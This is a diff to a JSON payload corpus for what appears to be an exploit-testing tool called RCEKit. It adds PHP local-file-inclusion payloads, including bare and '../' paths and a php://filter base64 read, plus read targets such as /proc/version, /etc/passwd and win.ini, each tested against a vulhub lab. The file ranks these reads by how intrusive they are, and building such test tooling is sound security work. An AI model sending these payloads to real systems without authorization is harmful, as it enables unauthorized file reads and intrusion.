@@ -753,6 +753,51 @@
       "verified": "not validated against a live Ghostscript here; the popen() path and the inherited stdout are documented output-device behaviour"
     }
   },
+  "include_wrappers": {
+    "plain": {
+      "sink_env": "any",
+      "safety": "safe",
+      "template": "__PATH__",
+      "requires": ["the value reaches a file-opening sink as the path, or as a prefix of one"],
+      "notes": "The path with nothing around it. Measured against vulhub php/inclusion, whose lfi.php is `include $_GET['file'];`: an absolute path is honoured, and so is a relative one once enough `../` are in front of it. Both are sent because which works is a property of the sink's own path handling, not of the target.",
+      "verified": "vulhub php/inclusion (vulhub/php:7.1.3-apache), 2026-10-31: /proc/version returned its content and ../../../proc/version returned the same"
+    },
+    "php_filter_base64": {
+      "sink_env": "any",
+      "safety": "safe",
+      "template": "php://filter/convert.base64-encode/resource=__PATH__",
+      "requires": ["a PHP stream-wrapper-aware sink (include, file_get_contents, readfile)"],
+      "notes": "Reads through a PHP filter, which base64-encodes the content on the way out. It needs no extra oracle: RCEKit's evidence search already peels base64 runs of 16 characters or more, and a file's worth of base64 is far past that, so the same content signature is found inside the encoded blob. It is worth sending beside `plain` because it proves more about the sink -- a stream wrapper was honoured, which `file_get_contents` of a plain path does not show -- and because it reads a file that a bare include would have *executed* instead of printing. Nothing here needs allow_url_include: the resource is local and the filter is not a URL wrapper.",
+      "verified": "vulhub php/inclusion, 2026-10-31: resource=/proc/version returned a 196-character base64 run decoding to the file's content"
+    }
+  },
+  "include_read_targets": {
+    "unix": [
+      {
+        "path": "/proc/version",
+        "signature": "Linux version",
+        "safety": "safe",
+        "notes": "The default, and chosen for what it does NOT return. Proving a read needs content that is predictable enough to recognise and absent from the payload-free control; it does not need the target's secrets on the operator's screen. This file satisfies the first and carries nothing but a kernel build string. Present on every Linux container.",
+        "verified": "vulhub php/inclusion, 2026-10-31: returned 'Linux version 5.15.167.4-microsoft-standard-WSL2 ...'"
+      },
+      {
+        "path": "/etc/passwd",
+        "signature": "root:x:0:0:",
+        "safety": "intrusive",
+        "notes": "The classic, held one rung up because it returns account names. The corpus already gates credential-adjacent reads this way, so a default run proves the read with /proc/version and only an operator who asked for the higher rung pulls account data back. Worth having for a target with no /proc -- a BSD, or a chroot that does not mount it.",
+        "verified": "vulhub php/inclusion, 2026-10-31: returned 'root:x:0:0:root:/root:/bin/bash'"
+      }
+    ],
+    "windows": [
+      {
+        "path": "C:\\Windows\\win.ini",
+        "signature": "; for 16-bit app support",
+        "safety": "safe",
+        "notes": "The Windows equivalent, and sensitive in nothing. Shipped from documentation rather than measurement: no Windows target is in the bench suite, so this entry is a shape offered to an operator who has one and not a path this project has confirmed.",
+        "verified": "not validated against a live Windows target here"
+      }
+    ]
+  },
   "deser_probes": {
     "java": {
       "label": "Java ObjectInputStream",
